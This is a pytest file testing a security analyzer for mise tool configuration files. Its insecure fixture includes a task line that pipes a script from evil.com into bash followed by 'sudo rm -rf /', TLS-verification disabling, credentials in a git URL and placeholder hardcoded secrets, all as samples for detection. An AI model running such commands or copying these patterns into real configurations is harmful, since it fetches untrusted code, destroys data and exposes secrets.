"""Tests for MiseAnalyzer."""

from pathlib import Path

from devai.mise_analyzer import MiseAnalyzer, MiseFinding


INSECURE_MISE = """\
min_version = "2024.1.1"

[tools]
node = "latest"
python = "system"
"go:asdf:https://github.com/asdf-community/asdf-golang.git" = "1.21"
plugin = "asdf:https://user:pass@github.com/org/custom-plugin.git?ref=main"

[env]
API_KEY = "hardcoded-secret-token-12345"
DATABASE_PASSWORD = "leaked-db-password"

[tasks.install]
run = "curl http://evil.com/install.sh | bash && sudo rm -rf /"
depends = ["setup"]

[tasks.deploy]
run = "curl --insecure https://example.com && export GIT_SSL_NO_VERIFY=1"
"""

INSECURE_TOOL_VERSIONS = """\
nodejs latest
python system
ruby *
"""

HARDENED_MISE = """\
min_version = "2024.1.1"

[tools]
node = "20.10.0"
python = "3.12.0"
"go:asdf:https://github.com/asdf-community/asdf-golang.git" = "1.21.5"

[env]
_.file = ".env.local"

[tasks.setup]
run = "mise install"

[settings]
experimental = false
"""

HARDENED_TOOL_VERSIONS = """\
nodejs 20.10.0
python 3.12.0
ruby 3.2.2
"""


class TestMiseAnalyzer:
    def test_detects_insecure_mise_toml(self, tmp_path: Path):
        (tmp_path / ".mise.toml").write_text(INSECURE_MISE, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "unpinned_git_ref" in kinds
        assert "curl_pipe_shell" in kinds
        assert "tls_verify_disabled" in kinds
        assert "dangerous_shell" in kinds
        assert "unpinned_tool" in kinds
        assert analyzer.health_score() < 50.0

    def test_detects_insecure_tool_versions(self, tmp_path: Path):
        (tmp_path / ".tool-versions").write_text(INSECURE_TOOL_VERSIONS, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.kind == "unpinned_tool" for f in findings)

    def test_hardened_mise_clean(self, tmp_path: Path):
        (tmp_path / "mise.toml").write_text(HARDENED_MISE, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_hardened_tool_versions_clean(self, tmp_path: Path):
        (tmp_path / ".tool-versions").write_text(HARDENED_TOOL_VERSIONS, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / ".mise.toml").write_text(INSECURE_MISE, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == ".mise.toml"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / ".mise.toml").write_text(INSECURE_MISE, encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        assert "Mise configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Mise analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_config(self):
        snippet = MiseAnalyzer(".").generate_hardened_config()
        assert "mise.toml" in snippet
        assert "mise install" in snippet

    def test_detects_mise_dir_tool_versions(self, tmp_path: Path):
        mise_dir = tmp_path / ".mise"
        mise_dir.mkdir()
        (mise_dir / ".tool-versions").write_text("nodejs latest\n", encoding="utf-8")
        analyzer = MiseAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == ".mise/.tool-versions" for f in findings)

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = MiseAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.configs == 0

    def test_finding_dataclass(self):
        finding = MiseFinding(
            kind="test",
            severity="low",
            message="test message",
            path=".mise.toml",
            lineno=1,
        )
        assert "test message" in finding.format()
